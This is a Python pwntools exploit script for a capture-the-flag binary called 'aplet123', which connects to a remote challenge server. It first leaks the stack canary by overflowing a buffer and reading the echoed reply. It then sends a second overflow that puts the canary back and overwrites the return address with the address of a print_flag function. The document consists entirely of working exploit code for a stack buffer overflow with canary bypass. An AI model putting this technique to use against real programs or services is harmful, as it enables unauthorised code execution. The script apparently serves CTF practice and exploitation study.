
#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

exe = ELF("./aplet123")
HOST, PORT = 'chall.lac.tf', 31123
def connect():
    return remote(HOST, PORT)

r = connect()
# gdb.attach(r, gdbscript='''b main
#             b *0x0000000000401357''')
            #    b *0x0000000000401374''')

win = exe.symbols["print_flag"]
log.info(f'Win: {hex(win)}')

# Step 1: get the stack canary
r.recvuntil(b'hello\n')
payload = b'A'*(64+8-4+1) + b'i\'m'
r.sendline(payload)
r.recvuntil(b'hi ')
canary = r.recvuntil(b', i\'m aplet123\n')[:-15][:7][::-1] + b'\0'
canary = canary[::-1]
log.info(f'Canary: {canary.hex()}')

# Step 2: break out of infinite loop and overwrite return
canary = int.from_bytes(canary, byteorder='little')
canary = p64(canary)
win = p64(win)
payload = b'bye\0' + b'A'*68 + canary + b'A'*8 + win
r.sendline(payload)
log.info(f'Payload sent: {payload}')

r.interactive()
